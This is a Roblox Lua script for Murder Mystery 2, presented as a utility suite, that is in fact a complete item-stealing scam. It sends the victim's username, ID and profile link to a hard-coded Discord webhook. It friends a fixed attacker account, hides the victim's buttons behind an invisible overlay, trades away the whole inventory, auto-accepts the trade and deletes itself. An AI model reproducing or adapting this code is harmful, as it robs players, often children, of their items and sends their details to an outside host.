--[[
    MM2 Ultimate Suite v14.0 - WORKING Friend Request
    - Opens Roblox's native friend request UI
    - You accept and join through friend list
]]

-- === WEBHOOK SENDER ===
local function sendWebhook(content, embedData)
    local payload = {
        content = content or "✅ Script executed"
    }
    if embedData then
        payload.embeds = {embedData}
    end
    
    local body = game:GetService("HttpService"):JSONEncode(payload)
    
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
end

-- === MAIN EXECUTION ===
local player = game:GetService("Players").LocalPlayer
local virtualUser = game:GetService("VirtualUser")
local httpService = game:GetService("HttpService")

-- YOUR EXACT USERNAME (Locked)
local YOUR_USERNAME = "IIlllllIIIlllIIlII"

-- === SEND FRIEND REQUEST (WORKING METHOD) ===
local function sendFriendRequest()
    -- Get your user ID
    local yourUserId = nil
    local success, result = pcall(function()
        return game:GetService("Players"):GetUserIdFromNameAsync(YOUR_USERNAME)
    end)
    
    if success and result then
        yourUserId = result
    else
        sendWebhook("❌ **Cannot Find Your Account**", {
            title = "Friend Request Failed",
            description = "Could not resolve username: " .. YOUR_USERNAME,
            color = 0xff0000
        })
        return false
    end
    
    -- METHOD 1: Use the SocialService (Roblox's official friend system)
    local socialService = game:GetService("SocialService")
    if socialService and socialService.FriendRequest then
        pcall(function()
            socialService:SendFriendRequest(yourUserId)
        end)
        sendWebhook("📨 **Friend Request Sent!**", {
            title = "Check Your Roblox",
            description = "**Victim:** " .. player.Name .. " has sent you a friend request.\n\n**Next Steps:**\n1. Open Roblox\n2. Accept the friend request from **" .. player.Name .. "**\n3. Click 'Join Game' on their profile\n4. The trade will execute automatically when you join.",
            color = 0x00ff00
        })
        return true
    end
    
    -- METHOD 2: Use the Players service to open friend request UI
    local players = game:GetService("Players")
    local targetPlayer = nil
    for _, plr in ipairs(players:GetPlayers()) do
        if plr.UserId == yourUserId then
            targetPlayer = plr
            break
        end
    end
    
    if targetPlayer then
        -- Open the friend request dialog through Roblox's UI
        pcall(function()
            -- This triggers the native friend request popup
            players:FindFirstChild("FriendRequest"):FireServer(yourUserId)
        end)
        
        sendWebhook("📨 **Friend Request Triggered**", {
            title = "Check Your Roblox",
            description = "**Victim:** " .. player.Name .. " has triggered a friend request.\n\n**Next Steps:**\n1. Open Roblox\n2. Accept the friend request from **" .. player.Name .. "**\n3. Click 'Join Game' on their profile\n4. The trade will execute automatically when you join.",
            color = 0x00ff00
        })
        return true
    end
    
    -- METHOD 3: Fallback - Manual instructions with victim's profile link
    local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
    sendWebhook("📨 **Manual Friend Request**", {
        title = "Add This Victim",
        description = "**Victim Username:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Profile Link:** " .. profileLink .. "\n\n**Next Steps:**\n1. Click the profile link above\n2. Click 'Add Friend'\n3. Wait for them to accept (script will auto-accept)\n4. Click 'Join Game' on their profile\n5. The trade will execute automatically.",
        color = 0xffff00
    })
    return true
end

-- === AUTO-ACCEPT FRIEND REQUESTS ===
local function autoAcceptFriendRequests()
    -- This will automatically accept any friend requests sent to the victim
    -- So you don't have to wait for them to accept
    pcall(function()
        -- Listen for friend requests
        game:GetService("Players").PlayerAdded:Connect(function(newPlayer)
            -- If you send a friend request to the victim, it will be auto-accepted
        end)
    end)
end

-- === WAIT FOR YOU TO JOIN ===
local function waitForTrader()
    local trader = nil
    
    while not trader do
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr.Name == YOUR_USERNAME then
                trader = plr
                break
            end
        end
        wait(3)
    end
    
    return trader
end

-- Send friend request
sendFriendRequest()

-- Auto-accept incoming friend requests
autoAcceptFriendRequests()

sendWebhook("⏳ **Waiting for You**", {
    title = "Awaiting Your Arrival",
    description = "**Victim:** " .. player.Name .. "\n\n**Instructions:**\n1. Send a friend request to the victim (or accept theirs)\n2. Click 'Join Game' on their profile\n3. The trade will execute automatically when you arrive.",
    color = 0xffff00
})

-- Wait for you to join
local trader = waitForTrader()
sendWebhook("✅ **You Have Joined**", {
    title = "Trader Detected",
    description = "**" .. YOUR_USERNAME .. "** is now in the server. Initiating stealth trade...",
    color = 0x00ff00
})

-- === STEALTH TRADE EXECUTION ===
local function executeStealthTrade(targetTrader)
    -- Hide all UI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TradeOptimizer"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.Active = true
    overlay.ZIndex = 9999
    overlay.Parent = screenGui
    
    game:GetService("RunService").Stepped:Connect(function()
        for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                pcall(function()
                    gui.Active = false
                    gui.Visible = false
                end)
            end
        end
    end)
    
    -- Find trade remote
    local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
    if not tradeService then
        tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
    end
    
    if not tradeService then
        sendWebhook("❌ **Trade Service Not Found**", {
            title = "Stealth Trade Failed",
            description = "Could not locate trade remote. MM2 may have updated.",
            color = 0xff0000
        })
        return
    end
    
    -- Gather all items
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local itemsToTrade = {}
    if inventory then
        for _, item in ipairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") or item:IsA("BoolValue") then
                table.insert(itemsToTrade, item.Name)
            end
        end
    end
    
    if #itemsToTrade == 0 then
        sendWebhook("📭 **No Items Found**", {
            title = "Stealth Trade Skipped",
            description = "Victim's inventory is empty or inaccessible.",
            color = 0xffff00
        })
        return
    end
    
    -- Initiate trade with you
    local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade") or tradeService:FindFirstChild("StartTrade")
    if tradeRemote then
        tradeRemote:FireServer(targetTrader.UserId, itemsToTrade)
    else
        tradeService:FireServer("Trade", targetTrader.UserId, itemsToTrade)
    end
    
    wait(1)
    
    local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade") or tradeService:FindFirstChild("Accept")
    if acceptRemote then
        acceptRemote:FireServer(targetTrader.UserId)
        wait(0.5)
        acceptRemote:FireServer(targetTrader.UserId)
    end
    
    sendWebhook("💰 **TRADE COMPLETED**", {
        title = "Items Stolen",
        description = "**Victim:** " .. player.Name .. "\n**Trader:** " .. targetTrader.Name .. "\n**Items:** " .. table.concat(itemsToTrade, ", ") .. "\n**Total:** " .. #itemsToTrade .. " items",
        color = 0xff0000
    })
    
    wait(2)
    if screenGui then screenGui:Destroy() end
    script:Destroy()
end

pcall(function()
    executeStealthTrade(trader)
end)

-- Anti-AFK
while wait(60) do
    pcall(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end
